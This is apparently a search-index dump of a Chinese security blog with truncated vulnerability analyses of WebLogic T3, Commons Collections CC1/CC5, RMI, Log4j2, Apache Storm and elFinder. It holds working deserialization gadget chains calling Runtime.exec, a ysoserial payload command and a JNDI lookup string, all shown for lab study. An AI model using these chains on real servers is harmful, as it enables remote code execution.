WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 WebLogic 14.1.1.0.0 环境搭建 本次测试环境选择12.2.1.4.0和jdk1.8.0_181 jdk版本过高会导致命令执行失败，最好是JDK\u003c1.8.191 地址如下： https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html 然后直接java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 即可 环境搭在ubuntu虚拟机里，接下来拷一下weblogic源码，使用java -jar wljarbuilder.jar创建wlfullclient.jar并和cryptoj.jar一起放入本地idea项目中 当时调试环境就因为源码不全导致一直出bug 漏洞分析 调用链如下 javax.management.BadAttributeValueExpException.readObject() weblogic.servlet.internal.session.SessionData.toString() weblogic.servlet.internal.session.SessionData.isDebuggingSession() weblogic.servlet.internal.session.SessionData.getAttribute() weblogic.servlet.internal.session.SessionData.getAttributeInternal() weblogic.servlet.internal.session.AttributeWrapperUtils.unwrapObject() weblogic.servlet.internal.session.AttributeWrapperUtils.unwrapEJBObjects() weblogic.ejb.container.internal.BusinessHandleImpl.getBusinessObject() weblogic.ejb20.internal.HomeHandleImpl.getEJBHome() javax.naming.Context.lookup() 这是一条新的gadget，我从调用链来一步步分析 首先我们来看javax.management.BadAttributeValueExpException#readObject，里面会跟进到toString()方法中，这个在cc链中经常用到，也就是说我们想进入那个类的toString()就给val进行赋值，值为该类的对象 接下来进入weblogic.servlet.internal.session.SessionData#toString方法，会先进行isValid()判断，主要判断HttpSession是否有效，有效的话会进入this.isDebuggingSession()里进行判断。因为SessionData是抽象类，因此在构造poc时我们可以通过其子类进行构造，可以使用FileSessionData类 接下来跟进this.isDebuggingSession()，会先进行registry.isProductionMode()判断本地注册表，因为本次是远程调试，因此会直接进入到this.getAttribute(\"wl_debug_session\") 继续跟进到this.getAttribute(\"wl_debug_session\")，会进行this.check(name)判断传进来的name值是否有效和是否为空，接下来会在this.getSecurityModuleAttribute(name)判断值是否为weblogic.formauth.targeturl，不等的话返回null，然后进入到this.getAttributeInternal(name) 继续跟进到this.getAttributeInternal(name)，进行两次空值判断后会进入到AttributeWrapperUtils.unwrapObject(name, (AttributeWrapper)中，其中this.attributes是一个Map，也就是说在构造poc时，new一个Map对象，对应的值分别为this.getAttribute(\"wl_debug_session\")中的wl_debug_session和一个AttributeWrapper类型的对象 继续跟进到weblogic.servlet.internal.session.AttributeWrapperUtils#unwrapObject中，会先获取传进来的Object o，然后对其进行判断，最后进入wrapper.isEJBObjectWrapped()中进行判断，而其是一个boolean类型的变量，因此在构造poc时给其赋值true，进入到unwrapEJBObjects()中 继续跟进到unwrapEJBObjects()，在该函数内，会对传进来的Object进行判断，而我们需要进入到getBusinessObject()，因此在构造poc时，构造一个BusinessHandle的实现类，这里先继续往下跟 继续跟进到weblogic.ejb.container.internal.BusinessHandleImpl#getBusinessObject中，因为this.businessObject和this.primaryKey初始变量都为null，则进入到this.homeHandle.getEJBHome()。到这里后看上一步需要构造一个BusinessHandle的实现类，此时的话就要new一个BusinessHandleImpl对象 继续跟进到weblogic.ejb20.internal.HomeHandleImpl#getEJBHome中，ctx.lookup()到这里就很明了了，JNDI注入点，而this.jndiNam和this.serverURL我们可控，自此整条链子分析完成 堆栈如下 getInstance:41, EnvironmentManager (weblogic.jndi.spi) getContext:353, Environment (weblogic.jndi) getContext:322, Environment (weblogic.jndi) getInitialContext:131, WLInitialContextFactory (weblogic.jndi) getInitialContext:684, NamingManager (javax.naming.spi) getDefaultInitCtx:313, InitialContext (javax.naming) init:244, InitialContext (javax.naming) \u003cinit\u003e:216, InitialContext (javax.naming) getEJBHome:66, HomeHandleImpl (weblogic.ejb20.internal) getBusinessObject:160, BusinessHandleImpl (weblogic.ejb.container.internal) unwrapEJBObjects:149, AttributeWrapperUtils (weblogic.servlet.internal.session) unwrapObject:122, AttributeWrapperUtils (weblogic.servlet.internal.session) getAttributeInternal:568, SessionData (weblogic.servlet.internal.session) getAttribute:547, SessionData (weblogic.servlet.internal.session) isDebuggingSession:1525, SessionData (weblogic.servlet.internal.session) toString:1537, SessionData (weblogic.servlet.internal.session) readObject:86, BadAttributeValueExpException (javax.management) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAcce","date":"2022-02-17","objectID":"/cve-2022-21350-weblogic-t3-rce/:0:0","tags":[],"title":"CVE-2022-21350 WebLogic T3 RCE 简单分析","uri":"/cve-2022-21350-weblogic-t3-rce/"},{"categories":[],"content":"前言 最近继续学习cc链，cc1链子中和cc5有部分重合的，这里就重点记录一下新知识 环境搭建 创建maven项目，pox.xml修改为如下内容 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003eysoserialPayload\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003csource\u003e6\u003c/source\u003e \u003ctarget\u003e6\u003c/target\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 这里选用的commons-collections3.1版本，idea无法自动添加，需要手动添加 jdk版本为：7u80 其中jdk需要小于8u71 这里先看一下ysoserial的gadget /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ 来看一下gadget，会发现他和cc5的区别在于，cc1使用了AnnotationInvocationHandler.invoke()去调用LazyMap.get()，而cc5是使用了TiedMapEntry.toString()去调用了LazyMap.get()，先前先分析了cc5，在这里就主要分析一下AnnotationInvocationHandler.invoke()是怎样调用LazyMap.get()的，在分析之前先来看一下动态代理 动态代理 先来看一下AnnotationInvocationHandler类的代码，其继承了InvocationHandler接口 class AnnotationInvocationHandler implements InvocationHandler, Serializable { ······ } 动态代理有一个主要函数为：Proxy.newProxyInstance()，其代码如下： public static Object newProxyInstance(ClassLoader loader, Class\u003c?\u003e[] interfaces, InvocationHandler h) throws IllegalArgumentException { 他有三个参数分别为 接口类的ClassLoader 接口或者接口数组 InvocationHandler实例 直接上代码，通过动态代理来举个例子： public class Test { public static void main(String[] args) { class Demo implements InvocationHandler { protected Map map; public Demo(Map map){ this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"我被调用了\"); // 判断使用get()方法时，返回值 if (method.getName().compareTo(\"get\") == 0){ return \"Hello World！\"; } return method.invoke(this.map,args); } } // 实例InvocationHandler对象 InvocationHandler invocationHandler = new Demo(new HashMap()); // 传入要被代理的对象 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); proxyMap.put(\"hello\",\"world\"); String result = (String) proxyMap.get(\"hello\"); System.out.println(result); } } 运行结果如下： 此时会发现，invoke()被调用了两次，这是为什么呢？ 来看下面这段代码 proxyMap.put(\"hello\",\"world\"); String result = (String) proxyMap.get(\"hello\"); 执行了两次proxyMap对象方法，而这个涉及到动态代理的一个重要知识点：动态代理对象每执行一个方法时，都会被转发到实现InvocationHandler接口类的invoke方法 接下来我们将proxyMap.put(\"hello\",\"world\");注释掉在执行一下，结果如下： 明白了这里，接下来来分析cc1就很容易了 漏洞分析 接下来进入正题，来看一下sun.reflect.annotation.AnnotationInvocationHandler#invoke invoke()方法中会调用get()，而其中memberValues参数我们可控，也就是说我们通过动态代理构造一个AnnotationInvocationHandler实例并调用其某个方法就会触发invoke()从而触发到LazyMap.get()，接下来就要考虑怎么能够自动执行invoke() 接下来来看一下sun.reflect.annotation.AnnotationInvocationHandler#readObject 可以看到在readObject()中有这么一行代码this.memberValues.entrySet()，而在进行反序列化时会自动执行readObject()方法，也就是说我们要让反序列化时执行AnnotationInvocationHandler的readObject方法，从而执行this.memberValues.entrySet()在自动调用invoke()中的this.memberValues.get() 完整代码如下： public class CommonsCollections1 { public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object unserialize(final byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); Objec","date":"2022-01-15","objectID":"/apache-commons-collections1/:0:0","tags":[],"title":"Apache Commons Collections1 反序列化漏洞分析","uri":"/apache-commons-collections1/"},{"categories":[],"content":"RMI原理 RMI(Remote Method Invocation)即Java远程方法调用是一种用于实现远程过程调用的应用程序接口。RMI实现了Java程序之间JVM的远程通信。 RMI框架如下： RMI底层采用了Stub(客户端)和Skeleton(服务端)机制，调用方法大致如下： RMI客户端先创建Stub(sun.rmi.registry.RegistryImpl_Stub) Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并且创建java.rmi.server.RemoteCall(远程调用)对象 RemoteCall会序列化RMI服务名称和Remote对象 远程引用层会将序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层 RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求后传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch) Skeleton会调用RemoteCall进行反序列化 Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端 RMI客户端反序列化服务端结果，获取远程对象的引用 RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端 RMI客户端反序列化RMI远程方法调用结果 实现RMI所需的API： java.rmi：提供客户端需要的类、接口和异常 java.rmi.server：提供服务端需要的类、接口和异常 java.rmi.registry：提供注册表的创建以及查找和命名远程对象的类、接口和异常 接下来上代码： 服务端代码 package rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer { // RMI服务器IP地址 public static String HOST = \"127.0.0.1\"; // RMI服务端口 public static int PORT = 8989; public static String RMI_PATA = \"/hello\"; // RMI服务名称 public static final String RMI_NAME = \"rmi://\" + HOST + \":\" + PORT +RMI_PATA; public static void main (String [] args){ try { // 注册RMI端口 LocateRegistry.createRegistry(PORT); // 创建一个服务 RMIInterface rmiInterface = new RMIImpl(); // 服务命名绑定 Naming.rebind(RMI_NAME,rmiInterface); System.out.println(\"启动RMI服务在\"+ RMI_NAME); }catch (Exception e){ e.printStackTrace(); } } } 在8989端口起了一个RMI服务，以rmi://127.0.0.1:8989/hello对应一个RMIImpl类实例，然后通过Naming.rebind(RMI_NAME,rmiInterface)绑定对用关系 服务端RMIInterface代码： package rmi; import java.rmi.Remote; import java.rmi.RemoteException; public interface RMIInterface extends Remote { String hello() throws RemoteException; } 定义了一个继承Remote的接口，具体实现代码在RMIImpl.java中 代码如下： package rmi; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIImpl extends UnicastRemoteObject implements RMIInterface { protected RMIImpl() throws RemoteException{ super(); } @Override public String hello() throws RemoteException{ System.out.println(\"call hello().\"); return \"this is hello().\"; } } 继承了UnicastRemoteObject并实现了RMIInterface接口，重写了hello()方法，UnicastRemoteObject类提供了很多支持RMI的方法，这些方法可以通过JRMP协议导出一个远程对象的引用，并通过动态代理构建一个可以和远程对象交互的Stub对象 接下来看客户端代码： package rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import static rmi.RMIServer.RMI_NAME; public class RMIClient { public static void main(String[] args) { try { // 获取服务注册器 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",8989); // 获取所有注册的服务 String[] list = registry.list(); for (String i : list){ System.out.println(\"已经注册的服务：\" + i); } // 寻找RMI_NAME对应的RMI实例 RMIInterface rt = (RMIInterface) Naming.lookup(RMI_NAME); // 调用Server的hello()方法,并拿到返回值 String result = rt.hello(); System.out.println(result); }catch (Exception e){ e.printStackTrace(); } } } 其中通过Naming.lookup(RMI_NAME)寻找对应的实例，这样就拿到了远程对象，可通过远程对象调用hello()方法 具体实现效果如下： RMI反序列化漏洞 在RMI中传输数据时，是使用序列化传输的，相应的就一定会进行反序列化数据，而在Java中，只要进行反序列化操作就可能会有漏洞，RMI通过序列化传输Remote对象，如果我们构造了一个恶意的Remote对象，那么在服务端进行反序列化时，就会触发反序列化漏洞 可以借用ysoserial去触发漏洞 因为本身jdk版本限制，借用了@Y4er师傅的图，下面两张也是 客户端会在sun.rmi.registry.RegistryImpl_Stub#bind中进行序列化 服务端会在sun.rmi.registry.RegistryImpl_Skel#dispatch 中进行反序列化 两个类都是动态生成类 RMI-JRMP反系列化 JRMP接口的两种常见实现方式： JRMP协议(Java Remote Message Protocol)，RMI专用的Java远程消息交换协议 IIOP协议(Internet Inter-ORB Protocol) ，基于 CORBA 实现的对象请求代理协议 JRMP和RMI利用过程一样 参考连接 https://y4er.com/post/java-rmi/ https://zhishihezi.net/c/5d644b6f81cbc9e40460fe7eea3c7925 ","date":"2022-01-06","objectID":"/rmi/:0:0","tags":[],"title":"RMI原理和反序列化","uri":"/rmi/"},{"categories":[],"content":"简介 Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。 影响版本 Apache Log4j2 \u003c=2.14.1 环境搭建 创建一个maven项目，pox.xml文件内容为以下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003elog4j-rce\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 然后创建一个类，类内容如下： import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j { private static final Logger logger = LogManager.getLogger(log4j.class); public static void main(String[] args) { logger.error(\"${jndi:ldap://127.0.0.1/}\"); } } 漏洞分析 其中System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");是为了绕过本地jdk限制，否则无法弹出计算器，详情可参考：https://y4er.com/post/attack-java-jndi-rmi-ldap-2/ 调用堆栈如下： lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:11, log4j 堆栈过长不在一一分析，直接进入到org.apache.logging.log4j.core.pattern.MessagePatternConverter#format中 该方法会对日志内容进行解析和格式化，并返回最终格式化后的日志内容，if判断字符是否为$,并且下一个字符是否为{，当符合时substring进行截取，接下来replace进行替换，此时可以发现，该变量可控 接下来进入org.apache.logging.log4j.core.lookup.StrSubstitutor#replace 首先会判断source是否为空值，然后进入到substitute方法中 在该方法中会进行一系列的字符判断后，会传入到resolveVariable中 传入到这里时，StrSubstitutor会将{}中的内容提取出来，传递给org.apache.logging.log4j.","date":"2021-12-28","objectID":"/cve-2021-44228-apache-log4j2-rce/:0:0","tags":[],"title":"CVE-2021-44228 Apache Log4j2 RCE 简单分析","uri":"/cve-2021-44228-apache-log4j2-rce/"},{"categories":[],"content":"rc1绕过 官方第一次发布了log4j-2.15.0-rc1 安全更新包，存在在开启Lookup配置时，可以被绕过 在 2.15.0-rc1的更新包中，默认不开启Lookup功能，并且使用SimpleMessagePatternConverter进行消息的格式化处理，不会解析其中的${}关键字，其次是在JndiManager#lookup中添加了白名单限制， 不过因为在lookup函数中进行判断时，由于校验逻辑错误，在catch异常后没有进行return返回，导致可以利用URISyntaxException异常来绕过lookup，例如在url中加入空格，在后续的版本中已被修复 参考链接 https://websecuritys.cn/archives/log4j2-rce.html# https://tttang.com/archive/1378/ https://paper.seebug.org/1789/#0x06-2150-rc1 ","date":"2021-12-28","objectID":"/cve-2021-44228-apache-log4j2-rce/:1:0","tags":[],"title":"CVE-2021-44228 Apache Log4j2 RCE 简单分析","uri":"/cve-2021-44228-apache-log4j2-rce/"},{"categories":[],"content":"简介 Apache Storm是一个免费开源、分布式、高容错的实时计算系统。Storm令持续不断的流计算变得容易，弥补了Hadoop批处理所不能满足的实时要求。Storm经常用于在实时分析、在线机器学习、持续计算、分布式远程调用和ETL等领域。Storm主要分为两种组件Nimbus和Supervisor。这两种组件都是快速失败的，没有状态。任务状态和心跳信息等都保存在Zookeeper上的，提交的代码资源都在本地机器的硬盘上。 漏洞描述 该漏洞是Nimbus Thrift服务器中的 Shell 命令注入漏洞，存在于getTopologyHistory服务中，攻击者可以通过向Nimbus服务器发送恶意制作的Thrift请求以在身份验证之前远程执行代码。 影响版本 Apache Storm 2.2.X \u003c 2.2.1 Apache Storm 2.1.X \u003c 2.1.1 Apache Storm 1.X \u003c 1.2.4 环境搭建 Storm需要配合zookeeper一起搭建，并且需要在Linux上，因为本漏洞只存在于Linux上。 本次测试使用的Storm版本为2.2.0 zookeeper搭建启动 下载完成后进入/apache-zookeeper-3.7.0-bin/conf目录下，执行以下命令启动zookeeper cp zoo_sample.cfg zoo.cfg cd ../bin ./zkServer.sh start storm搭建启动 下载完成后进入/apache-storm-2.2.0/conf目录下，修改storm.yaml文件 将ip修改为本机ip，端口自定义 storm.zookeeper.servers: - \"192.168.23.129\" nimbus.seeds : [\"192.168.23.129\"] ui.port: 8081 然后执行以下命令启动storm 注意先启动zookeeper，然后执行python脚本 cd ../bin python3 storm.py nimbus python3 storm.py supervisor python3 storm.py ui 然后访问8080端口,ui页面成功搭建 接下来需要添加计算机作业Topology 创建一个maven项目，修改pom.xml内容为： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003estormJob\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e8\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e8\u003c/maven.compiler.target\u003e \u003c/properties\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.storm\u003c/groupId\u003e \u003cartifactId\u003estorm-core\u003c/artifactId\u003e \u003cversion\u003e2.2.0\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 然后创建sum.ClusterSumStormTopology类 将类的内容修改为： package sum; import java.util.Map; import org.apache.storm.Config; import org.apache.storm.StormSubmitter; import org.apache.storm.generated.AlreadyAliveException; import org.apache.storm.generated.AuthorizationException; import org.apache.storm.generated.InvalidTopologyException; import org.apache.storm.spout.SpoutOutputCollector; import org.apache.storm.task.OutputCollector; import org.apache.storm.task.TopologyContext; import org.apache.storm.topology.OutputFieldsDeclarer; import org.apache.storm.topology.TopologyBuilder; import org.apache.storm.topology.base.BaseRichBolt; import org.apache.storm.topology.base.BaseRichSpout; import org.apache.storm.tuple.Fields; import org.apache.storm.tuple.Tuple; import org.apache.storm.tuple.Values; import org.apache.storm.utils.Utils; public class ClusterSumStormTopology { /** * Spout需要继承BaseRichSpout * 产生数据并且发送出去 * */ public static class DataSourceSpout extends BaseRichSpout{ private SpoutOutputCollector collector; /** * 初始化方法，在执行前只会被调用一次 * @param conf 配置参数 * @param context 上下文 * @param collector 数据发射器 * */ public void open(Map conf, TopologyContext context, SpoutOutputCollector collector) { this.collector = collector; } int number = 0; /** * 产生数据，生产上一般是从消息队列中获取数据 * */ public void nextTuple() { this.collector.emit(new Values(++number)); System.out.println(\"spout发出：\"+number); Utils.sleep(1000); } /** * 声明输出字段 * @param declarer * */ public void declareOutputFields(OutputFieldsDeclarer declarer) { /** * num是上nextTuple中emit中的new Values对应的。上面发几个，这里就要定义几个字段。 * 在bolt中获取的时候，只需要获取num这个字段就行了。 * */ declarer.declare(new Fields(\"num\")); } } /** * 数据的累计求和Bolt * 接收数据并且处理 * */ public static class SumBolt extends BaseRichBolt{ /** * 初始化方法，只会被执行一次 * */ public void prepare(Map stormConf, TopologyContext context, OutputCollector collector) { } int sum=0; /** * 获取spout发送过来的数据 * */ public void execute(Tuple input) { //这里的num就是在spout中的declareOutputFields定义的字段名 //可以根据index获取，也可以根据上一个环节中定义的名称获取 Integer value = input.getIntegerByField(\"num\"); sum+=value; System.out.println(\"Bolt:sum=\"+sum); } /** * 声明输出字段 * @param declarer * */ public void declareOutputFields(OutputFieldsDeclarer declarer) { } } public static void main (String[] args){ //TopologyBuilder根据spout和bolt来构建Topology //storm中任何一个作业都是通过Topology方式进行提交的 //Topology中需要指定spout和bolt的执行顺序 TopologyB","date":"2021-12-24","objectID":"/cve-2021-38294-apache-storm-nimbus-rce/:0:0","tags":[],"title":"CVE-2021-38294 Apache Storm Nimbus RCE 简单分析","uri":"/cve-2021-38294-apache-storm-nimbus-rce/"},{"categories":[],"content":"前言 Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的@breenmachine 在一篇长博客上阐述，危害面覆盖了大部分的Web中间件，影响十分深远。 影响版本 Apache Commons Collections \u003c= 3.2.1，\u003c= 4.0.0 环境搭建 使用idea创建一个maven项目，在pom.xml文件中加入commons-collections依赖。 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003eysoserialPayload\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 在这里commons-collections组件没有3.1版本，idea无法自动引入，需要手动添加 创建一个java文件，包含有序列化和反序列化方法 package payload; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class CommonsCollections5 { public static void main(String[] args) { deserialize(); } public static void serialize(Object obj) { try { ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(\"test.ser\")); os.writeObject(obj); os.close(); } catch (Exception e) { e.printStackTrace(); } } public static void deserialize() { try { ObjectInputStream is = new ObjectInputStream(new FileInputStream(\"test.ser\")); is.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 漏洞复现 在这里使用ysoserial工具生成payload，然后运行我们创建的java文件达成命令执行的效果 java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 calc \u003e test.ser 漏洞分析 漏洞出现在org.apache.commons.collections.functors.InvokerTransformer#transform 该类继承了Transformer和Serializable接口，然后可以看出下面使用反射方法，而其中的this.iMethodName、this.iParamTypes和this.iArgs变量可控，导致可以用反射去调用Runtime.getRuntime().exec(cmd)执行系统命令。 构造如下代码，去控制变量尝试弹出计算器 package payload; import org.apache.commons.collections.functors.InvokerTransformer; public class CommonsCollections5 { public static void main(String[] args){ InvokerTransformer invokerTransformer = new InvokerTransformer( \"exec\", new Class[]{String.class}, new String[]{\"calc\"} ); invokerTransformer.transform(Runtime.getRuntime()); } } 我们知道在执行反序列化操作时，会自动执行readObject函数，如果直接序列化上面的InvokerTransformer对象，那么在readObject之后还需要主动调用transform(Runtime.getRuntime())，这显然是不实际的，因为无法自动创建transform对象，因此我们接下来需要解决两个问题： 自动执行Runtime.getRuntime() 自动执行invokerTransformer.transform() 其中第一个问题的解决方案在org.apache.commons.collections.functors.ChainedTransformer#transform中可以解决 该类也继承了Transformer和Serializable接口，我们可以定义一个Transformer数组，里面放入多个InvokerTransformer经过多次反射调用来实现自动执行Runtime.getRuntime() package payload; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; class CommonsCollections5 { public static void main(String[] args) throws Exception { // ((Runtime) Runtime.class.getMethod(\"getRuntime\").invoke(null)).exec(\"calc\"); Transformer[] transformers = new Transformer[]{ // 传入Runtime类 new ConstantTransformer(Runtime.class), // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime() new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), // invoke()调用Runtime.class.getMethod(\"getRuntime\").invoke(null) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), // 调用exec(\"calc\") new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}) }; ChainedTransformer chain = new ChainedTransformer(transformers); chain.transform(null); } } 接下来第二个问题，解决思路为全局搜索那个类会去调用transform()，然后继续搜索该类中调用transform()的方法可以被其它的类调用，直到其被重写的readObject()调用。 其中在org.apache.commons.collections.map.LazyMap#get调用了transform() 可以构造出以下代码 HashMap hashMap = new HashMap(); Map map = LazyMap.decorate(hashMap, chain); map.get(\"test\"); /","date":"2021-12-20","objectID":"/apache-commons-collections5/:0:0","tags":[],"title":"Apache Commons Collections5 反序列化漏洞分析","uri":"/apache-commons-collections5/"},{"categories":[],"content":"简介 elFinder 是一个开源的 web 文件管理器，使用 jQuery UI 用 Ja​​vaScript 编写。Creation 的灵感来自于 Mac OS X 操作系统中使用的 Finder 程序的简单性和便利性。 漏洞描述 该漏洞源于,在创建新的zip存档时，没有对name参数进行严格的过滤，导致参数被带入prox_open中执行，造成命令注入 影响版本 elFinder \u003c= 2.1.58 环境搭建 下载地址： https://github.com/Studio-42/elFinder 下载完成后，重命名/php/connector.minimal.php-dist为/php/connector.minimal.php 